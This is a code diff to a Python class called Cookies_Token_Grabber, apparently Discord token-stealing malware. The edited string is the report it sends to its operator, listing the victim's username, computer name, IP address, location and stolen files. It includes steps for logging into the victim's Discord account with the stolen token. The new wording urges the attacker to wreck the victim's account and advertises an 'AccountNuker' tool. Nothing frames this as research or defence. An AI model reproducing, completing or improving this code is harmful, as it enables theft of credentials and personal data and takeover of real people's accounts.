@@ -295,7 +295,7 @@ class Cookies_Token_Grabber:
                         "url": "",
                         "icon_url": ""
                     },
-                    "description": f"**{os.getlogin()}** Just ran Cookies Token Grabber\n[Google Maps Location]({googlemap})\n\nComputerName: ||{os.getenv('COMPUTERNAME')}||\n\nIP: ||{ip}||\n\nCity: {city}\n\nRegion: {region}\n\nCountry: {country}\n\n\n```{self.fileCount}\n\n{self.files}```\nTo login with discord token goto [here]({pastebin}) copy the RAW code then goto [discord.com/login]({discordlogin}) and open the Console (CTRL + SHIFT + I) delete everything and paste the code you copied then paste the discord token in the correct place and hit ENTER to login (Or a much easier way is to get my AccountNuker ;)\n",
+                    "description": f"Looks like **{os.getlogin()}** ran Cookies Token Grabber start fucking there shit up!\n\n[Geo-Locate]({googlemap})\n\nComputerName: ||{os.getenv('COMPUTERNAME')}||\n\nIP: ||{ip}||\n\nCity: {city}\n\nRegion: ||{region}||\n\nCountry: ||{country}||\n\nTo login with discord token goto [here]({pastebin}) copy the RAW code then goto [discord.com/login]({discordlogin}) and open the Console (CTRL + SHIFT + I) delete everything and paste the code you copied then paste the discord token in the correct place and hit ENTER to login (Or a much easier way is to get my AccountNuker ;)\n",
                     "color": 11600892,
                                                                                                                                         # Add local ip ^^
                     "thumbnail": {
